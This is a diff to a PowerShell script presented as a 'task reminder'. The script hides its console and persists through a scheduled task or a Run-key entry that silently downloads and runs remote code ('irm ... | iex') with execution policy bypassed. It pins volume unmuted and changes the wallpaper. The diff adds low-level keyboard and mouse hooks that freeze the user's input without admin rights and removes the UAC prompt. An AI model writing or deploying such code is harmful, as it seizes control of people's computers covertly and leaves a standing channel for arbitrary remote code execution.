@@ -20,51 +20,15 @@ $MinimizeAll     = $true  # minimise all windows at each reminder
 $MaxAudioWait    = 60     # never wait longer than this (seconds) for audio to finish
 $ShowConsole     = $false # set to $true when debugging (keeps the window visible)
 
-$FreezeInput     = $true  # block keyboard/mouse while audio plays (needs admin)
+$FreezeInput     = $true  # block keyboard/mouse while audio plays (no admin needed)
 $FreezeVolume    = $true  # keep volume pinned and unmuted while audio plays
 
 $TaskName        = "TaskReminder"
 $DailyStartTime  = "08:00"  # daily start, in addition to every logon
-$LogonDelay      = "PT30S"  # wait after login so the network is up
+$LogonDelay      = "PT20S"  # wait after login before starting
 # ==========================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# ---- Elevation (needed for input blocking and the highest-privilege task) ----
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-$PsExe   = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-$RunCmd  = "irm '$ScriptUrl' | iex"
-
-if (-not $isAdmin) {
-    # One UAC prompt; relaunch this script elevated and exit this copy
-    Start-Process $PsExe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$RunCmd`""
-    exit
-}
-
-# ---- Autostart: scheduled task (every logon + daily). Created only if missing ----
-$autostartErr = $null
-try {
-    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
-        $action = New-ScheduledTaskAction -Execute $PsExe -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
-        $logon  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
-        $logon.Delay = $LogonDelay
-        $daily  = New-ScheduledTaskTrigger -Daily -At $DailyStartTime
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-                    -StartWhenAvailable -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew `
-                    -ExecutionTimeLimit ([TimeSpan]::Zero)
-        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
-        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($logon, $daily) `
-            -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
-    }
-} catch {
-    $autostartErr = $_.Exception.Message
-    # Fallback: HKCU Run key (starts non-elevated, so it will show a UAC prompt each login)
-    try {
-        $cmd = "`"$PsExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
-        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value $cmd -ErrorAction Stop
-        $autostartErr += " (fell back to HKCU Run key)"
-    } catch { $autostartErr += " | Run key failed: $($_.Exception.Message)" }
-}
 
 $Dir = Join-Path $env:TEMP "TaskReminder"
 New-Item -ItemType Directory -Path $Dir -Force | Out-Null
@@ -76,7 +40,6 @@ function Log($m) {
 }
 
 # ---- Hide the terminal window hosting this script ----
-# (hiding keeps the program running; closing the window would end it)
 if (-not $ShowConsole) {
     try {
         Add-Type @"
@@ -90,7 +53,7 @@ public class WinHide {
 "@ -ErrorAction Stop
         $c = [WinHide]::GetConsoleWindow()
         if ($c -ne [IntPtr]::Zero) {
-            $root = [WinHide]::GetAncestor($c, 3)    # GA_ROOTOWNER = the visible terminal window
+            $root = [WinHide]::GetAncestor($c, 3)
             if ($root -eq [IntPtr]::Zero) { $root = $c }
             [void][WinHide]::ShowWindow($root, 0)
             if ($root -ne $c) { [void][WinHide]::ShowWindow($c, 0) }
@@ -99,15 +62,54 @@ public class WinHide {
     } catch { Log "HIDE FAILED: $($_.Exception.Message)" }
 }
 
-Log "--- started. Admin: $isAdmin, Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion), apartment: $([Threading.Thread]::CurrentThread.GetApartmentState())"
-if ($autostartErr) { Log "AUTOSTART PROBLEM: $autostartErr" }
+$whoami = "$env:USERDOMAIN\$env:USERNAME"
+Log "--- started as $whoami. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion)"
 
-# Only one copy at a time
+# ---- Only one copy at a time ----
 $mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
 if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
 $PID | Out-File (Join-Path $Dir "pid.txt")
 
-# Download assets (always refreshed so old cached copies never linger)
+# ---- Autostart (runs as YOU, no admin needed) ----
+# Tries a scheduled task (logon + daily); falls back to the HKCU Run key. Result is logged.
+$PsExe  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+$RunCmd = "irm '$ScriptUrl' | iex"
+$taskOk = $false
+try {
+    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
+        $taskOk = $true
+        Log "AUTOSTART: scheduled task already exists"
+    } else {
+        $action = New-ScheduledTaskAction -Execute $PsExe -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
+        $logon  = New-ScheduledTaskTrigger -AtLogOn -User $whoami
+        $logon.Delay = $LogonDelay
+        $daily  = New-ScheduledTaskTrigger -Daily -At $DailyStartTime
+        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+                    -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)
+        $principal = New-ScheduledTaskPrincipal -UserId $whoami -LogonType Interactive -RunLevel Limited
+        Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($logon, $daily) `
+            -Settings $settings -Principal $principal -Force -ErrorAction Stop | Out-Null
+        if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
+            $taskOk = $true
+            Log "AUTOSTART: scheduled task created for $whoami"
+        } else { Log "AUTOSTART: task registration returned no error but task not found" }
+    }
+} catch { Log "AUTOSTART TASK FAILED: $($_.Exception.Message)" }
+
+if (-not $taskOk) {
+    try {
+        $cmd = "`"$PsExe`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$RunCmd`""
+        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value $cmd -ErrorAction Stop
+        Log "AUTOSTART: fell back to HKCU Run key"
+    } catch { Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" }
+}
+
+# ---- Wait for network (up to 60s) so the downloads work right after login ----
+$n = 0
+while (-not [System.Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60) { Start-Sleep -Seconds 1; $n++ }
+if ($n -gt 0) { Log "Waited ${n}s for network" }
+
+# ---- Download assets (always refreshed) ----
 foreach ($i in 1..5) {
     foreach ($f in "image$i.jpg", "audio$i.wav") {
         $dest = Join-Path $Dir $f
@@ -125,7 +127,7 @@ foreach ($i in 1..5) {
     }
 }
 
-# Wallpaper support
+# ---- Wallpaper support ----
 $wpOk = $false
 try {
     Add-Type @"
@@ -140,21 +142,83 @@ public class WP {
     $wpOk = $true
 } catch { Log "WALLPAPER SETUP FAILED: $($_.Exception.Message)" }
 
-# Input blocking support
-$lockOk = $false
+# ---- Input freeze support (low-level keyboard + mouse hooks, no admin needed) ----
+$freezeOk = $false
 if ($FreezeInput) {
     try {
         Add-Type -ErrorAction Stop @"
+using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
-public class InputLock {
-    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlock);
+using System.Threading;
+
+public class InputFreezer {
+    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
+    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
+    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern IntPtr GetModuleHandle(string name);
+    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
+    [DllImport("user32.dll")] static extern int GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
+    [DllImport("user32.dll")] static extern bool PostThreadMessage(uint idThread, uint msg, IntPtr w, IntPtr l);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptx; public int pty; }
+
+    static HookProc kbProc = KbCallback;
+    static HookProc msProc = MsCallback;
+    static IntPtr hKb = IntPtr.Zero, hMs = IntPtr.Zero;
+    static Thread t;
+    static uint tid;
+    static ManualResetEvent ready;
+    public static bool Ok;
+    public static int LastError;
+
+    static IntPtr KbCallback(int n, IntPtr w, IntPtr l) { if (n >= 0) return (IntPtr)1; return CallNextHookEx(hKb, n, w, l); }
+    static IntPtr MsCallback(int n, IntPtr w, IntPtr l) { if (n >= 0) return (IntPtr)1; return CallNextHookEx(hMs, n, w, l); }
+
+    public static bool Start() {
+        if (t != null) return Ok;
+        ready = new ManualResetEvent(false);
+        Ok = false;
+        t = new Thread(() => {
+            tid = GetCurrentThreadId();
+            IntPtr mod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
+            hKb = SetWindowsHookEx(13, kbProc, mod, 0);   // WH_KEYBOARD_LL
+            if (hKb == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
+            hMs = SetWindowsHookEx(14, msProc, mod, 0);   // WH_MOUSE_LL
+            if (hMs == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
+            Ok = (hKb != IntPtr.Zero && hMs != IntPtr.Zero);
+            ready.Set();
+            if (Ok) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
+            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
+            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
+            hKb = IntPtr.Zero; hMs = IntPtr.Zero;
+        });
+        t.IsBackground = true;
+        t.Start();
+        ready.WaitOne(3000);
+        if (!Ok) Stop();
+        return Ok;
+    }
+
+    public static void Stop() {
+        if (t == null) return;
+        PostThreadMessage(tid, 0x0012, IntPtr.Zero, IntPtr.Zero);   // WM_QUIT
+        if (!t.Join(2000)) {
+            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
+            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
+        }
+        t = null; Ok = false;
+    }
 }
 "@
-        $lockOk = $true
-    } catch { Log "INPUT LOCK SETUP FAILED: $($_.Exception.Message)" }
+        $freezeOk = $true
+    } catch { Log "INPUT FREEZE SETUP FAILED: $($_.Exception.Message)" }
 }
 
-# System volume support (Windows Core Audio)
+# ---- System volume support (Windows Core Audio) ----
 $volOk = $false
 if ($SetSystemVolume) {
     try {
@@ -210,14 +274,14 @@ public class SysVol {
     } catch { Log "VOLUME SETUP FAILED: $($_.Exception.Message)" }
 }
 
-# Audio support
+# ---- Audio support ----
 $player = $null
 try {
     Add-Type -AssemblyName PresentationCore -ErrorAction Stop
     $player = New-Object System.Windows.Media.MediaPlayer
 } catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }
 
-# Main loop
+# ---- Main loop ----
 $last = 0
 while ($true) {
     do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
@@ -250,9 +314,8 @@ while ($true) {
             $player.Close()
             $player = New-Object System.Windows.Media.MediaPlayer
             $player.Open([Uri]$file)
-            $player.Volume = 1.0   # full player volume; loudness is set by the system volume
+            $player.Volume = 1.0
 
-            # wait up to 3s for the file to finish loading
             $t = 0
             while (-not $player.NaturalDuration.HasTimeSpan -and $t -lt 30) {
                 Start-Sleep -Milliseconds 100
@@ -279,15 +342,16 @@ while ($true) {
 
     if ($waitMs -gt 0) {
         # Freeze keyboard/mouse for the length of the audio
-        $locked = $false
-        if ($FreezeInput -and $lockOk) {
-            try { $locked = [InputLock]::BlockInput($true); Log "Input blocked: $locked" }
-            catch { Log "BLOCK FAILED: $($_.Exception.Message)" }
+        $frozen = $false
+        if ($FreezeInput -and $freezeOk) {
+            try {
+                $frozen = [InputFreezer]::Start()
+                if ($frozen) { Log "Input frozen" } else { Log "INPUT FREEZE FAILED (win32 error $([InputFreezer]::LastError))" }
+            } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
         }
         try {
             $end = (Get-Date).AddMilliseconds($waitMs)
             while ((Get-Date) -lt $end) {
-                # keep volume pinned and unmuted, even if changed from a headset, mixer, etc.
                 if ($FreezeVolume -and $volOk) {
                     try {
                         if ([SysVol]::Mute) { [SysVol]::Mute = $false }
@@ -297,7 +361,7 @@ while ($true) {
                 Start-Sleep -Milliseconds 100
             }
         } finally {
-            if ($locked) { [void][InputLock]::BlockInput($false); Log "Input unblocked" }
+            if ($frozen) { [InputFreezer]::Stop(); Log "Input released" }
         }
     }
 
